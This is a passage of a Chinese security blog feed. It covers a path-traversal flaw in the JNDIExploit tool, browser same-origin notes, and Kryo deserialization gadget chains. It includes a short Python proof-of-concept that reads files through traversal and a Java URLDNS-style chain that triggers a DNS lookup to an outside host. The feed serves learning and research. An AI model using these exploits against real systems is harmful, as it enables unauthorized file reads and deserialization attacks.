+path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">       <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">           fileInputStream.read(bytes);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">           exchange.getResponseBody().write(bytes);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       exchange.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>他会获取最后一个<code>/</code>并与当前pwd拼接，但是在Windows系统中，路径是用<code>\</code>进行表示的，所以在windows上运行该工具会造成相应的任意文件读取。<br>这里我用python进行攻击<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/4.png" alt><br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/3.png" alt><br>可以看到返回了文件内容。而我d盘下也确实有该文件<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/5.png" alt><br>当然不止<code>handleFileRequest</code>有这个问题，其他的函数都是这么处理的，所以都会导致该漏洞的产生。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filename = <span class="string">&#x27;..\\..\\..\\..\\..\\flag&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:3456/&quot;</span></span><br><span class="line">r = requests.get(url+filename)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;路径穿越漏洞&quot;&gt;&lt;a href=&quot;#路径穿越漏洞&quot; class=&quot;headerlink&quot; title=&quot;路径穿越漏洞&quot;&gt;&lt;/a&gt;路径穿越漏洞&lt;/h2&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>前端安全1-浏览器安全模型（笔记）</title>
    <link href="http://example.com/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-12T02:02:09.000Z</published>
    <updated>2023-09-23T16:24:08.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。</p><ul><li><a href="https://ithelp.ithome.com.tw/users/20091346/ironman/6155">https://ithelp.ithome.com.tw/users/20091346/ironman/6155</a></li><li><a href="https://blog.huli.tw/">https://blog.huli.tw/</a></li></ul><p>因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了<br><span id="more"></span></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://ithelp.ithome.com.tw/articles/10314125">https://ithelp.ithome.com.tw/articles/10314125</a></li></ul><h2 id="前端运行环境"><a href="#前端运行环境" class="headerlink" title="前端运行环境"></a>前端运行环境</h2><p><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>先看到上图，前端是运行在浏览器之中的，而浏览器会给前端一大堆的限制</p><h3 id="禁止主动文件读取"><a href="#禁止主动文件读取" class="headerlink" title="禁止主动文件读取"></a>禁止主动文件读取</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> onchange=<span class="string">&quot;show(this)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">input</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="property">onload</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(event.<span class="property">target</span>.<span class="property">result</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="title function_">readAsText</span>(input.<span class="property">files</span>[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码创建了一个input元素，用于上传文件。当文件选择框中选择了文件后，会触发onchange事件，执行show函数。show函数创建了一个FileReader对象，用于读取上传的文件。然后将读取的文件内容转换为文本格式，并通过alert弹窗显示出来。<br>这种只能是人工选择的时候可以读取到，但是不能主动去读取。</p><p>当然也有可以绕过的特例</p><ul><li><a href="https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser">https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser</a></li></ul><p>他是利用了opera: 这个协议有着更高的权限，和一些特殊功能，可以用来访问文件，截图网页等<br>更多细节可以看上面的原文，在这里不过多赘述<br>总结一下就是利用opera访问文件然后对文件内容做了个截图以后回传到攻击端</p><h3 id="禁止使用系统api"><a href="#禁止使用系统api" class="headerlink" title="禁止使用系统api"></a>禁止使用系统api</h3><p>这里只能使用一些浏览器提供的函数，比如fetch之类的<br>当然浏览器也会开放一些api</p><ul><li>Web Bluetooth API</li><li>MediaDevices API</li></ul><h3 id="禁止读取其他网页的内容"><a href="#禁止读取其他网页的内容" class="headerlink" title="禁止读取其他网页的内容"></a>禁止读取其他网页的内容</h3><p>我的kaikaix.github.io是读取不到google.com的任何内容的，这种就是同源策略(same-origin policy)，简称SOP<br>当在控制台输入以下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://kaikaix.github.io&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(win.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><br>这段代码创建了一个新的浏览器窗口并打开了一个指定的网页。然后使用setTimeout函数在3秒后输出新窗口的URL地址。<br>我在blog.huli.tw网站下开启控制台执行的结果如下<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>但是如果我在kaikaix.github.io执行的话<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>就可以成功输出url</p><p>当然也有方法可以拿到其他网站的信息<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1">https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/users/20091346/ironman/6155&quot;&gt;https://ithelp.ithome.com.tw/users/20091346/ironman/6155&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.huli.tw/&quot;&gt;https://blog.huli.tw/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>python的trick</title>
    <link href="http://example.com/2023/09/11/python%E7%9A%84trick/"/>
    <id>http://example.com/2023/09/11/python%E7%9A%84trick/</id>
    <published>2023-09-11T14:18:20.000Z</published>
    <updated>2023-10-01T17:14:07.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title="#"></a>#</h1><p>python wsgi 中不区分请求头中的- 和_<br>解析参数的顺序</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;#&quot;&gt;&lt;/a&gt;#&lt;/h1&gt;&lt;p&gt;python wsgi 中不区分请求头中的- 和_&lt;br&gt;解析参数的顺序&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>kryo反序列化</title>
    <link href="http://example.com/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-09-07T15:20:02.000Z</published>
    <updated>2023-09-11T06:17:02.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入门kryo"><a href="#入门kryo" class="headerlink" title="入门kryo"></a>入门kryo</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>首先看个简单的demo<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;Hello Kryo&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="3种序列化与反序列化"><a href="#3种序列化与反序列化" class="headerlink" title="3种序列化与反序列化"></a>3种序列化与反序列化</h3><p>如果是知道序列化类型，并且不为空<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeObject(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObject(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果是知道序列化类型，并且有可能为空<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeObjectOrNull(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果都是不确定的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeClassAndObject(output, object);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> SomeClass) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="kryo注册"><a href="#kryo注册" class="headerlink" title="kryo注册"></a>kryo注册</h3><blockquote><p>当不知道序列化的类是什么的时候可以不用注册，一般是为了提高反序列化的效率启用这种注册功能。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class);</span><br><span class="line"><span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> ...</span><br><span class="line">kryo.writeObject(output, object);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class, <span class="number">9</span>);</span><br><span class="line">kryo.register(AnotherClass.class, <span class="number">10</span>);</span><br><span class="line">kryo.register(YetAnotherClass.class, <span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>看到上面两段代码，第一个没有id，他会自动给你分配id，后面那段是在参数中提供id，这个id在序列化和反序列化的时候要保持一致，不能用9的去反序列化10的</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>首先获取前面获取的register<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt><br>然后就开始写入序列化数据<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt><br>最后会根据serializer类型写入序列化数据，在这里的serializer就是string类型的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt><br>更加详细的就不说了，还是得自己调试才行，总体流程就是</p><ul><li>获取registration</li><li>获取filed，进行filed.write</li><li>在write中获取相对应的serializer</li><li>调用serializer.write，进行最后的写入</li></ul><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化的流程与序列化基本一致，只不过就是把write改为了read<br>当反序列化的类型为一个Object类型的时候，可以看到如下的过程，先创建一个Object的实例，接着循环把成员变量那些给赋值上<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br>看看Create中的实现<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>他主要有几个步骤</p><ul><li>获取到无参构造</li><li>如果是private类型，就先让他变成可以访问的 -&gt; <em>ctor.setAccessible(true);</em></li><li>调用无参构造函数，并返回该实例</li></ul><p>但是有些利用链可能没有无参构造这时候应该怎么办<br>看到官网<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p><blockquote><p>The Objenesis StdInstantiatorStrategy uses JVM specific APIs to create an instance of a class without calling any constructor at all. Using this is dangerous because most classes expect their constructors to be called.<br><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));</code><br>当设置这个策略的时候会不调用任何的构造函数</p></blockquote><h2 id="常用调用链"><a href="#常用调用链" class="headerlink" title="常用调用链"></a>常用调用链</h2><p>常用的调用链基本是因为HashMap.put中,会调用到key的equals方法和hashcode方法，而key又是我们可控的，这时候就可以进行一些常规的调用链利用了<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt><br>首先看到他先反序列化了key，接着反序列化了value，最后进行了put操作</p><h3 id="hashCode利用"><a href="#hashCode利用" class="headerlink" title="hashCode利用"></a>hashCode利用</h3><p><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt><br>可以看到hash中触发了key的hashcode方法</p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>首先是最简单的URL利用链<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://x.xxx.tu4.org&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>具体就不分析了，就是会触发URL.hashcode最后触发dnslog</p><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a><h3 style="text-decoration: line-through;">TiedMapEntry</h3></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 